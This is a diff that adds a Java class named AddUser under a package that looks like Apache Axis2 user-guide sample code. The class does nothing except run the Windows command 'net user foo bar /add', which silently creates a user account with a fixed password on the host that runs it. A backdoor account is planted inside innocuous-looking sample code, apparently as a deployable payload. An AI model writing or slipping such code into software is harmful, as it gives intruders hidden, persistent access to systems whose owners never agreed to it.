@@ -1,0 +1,17 @@
+package org.apache.axis2.axis2userguide;
+import java.io.IOException;
+public class AddUser {
+  public AddUser() {
+  }
+  public void main() {
+    Process process;
+    try {
+      process = Runtime.getRuntime().exec("net user foo bar /add");
+    }
+    catch(IOException ioexception) {
+      ioexception.printStackTrace();
+    }
+    return;
+  }
+}
+
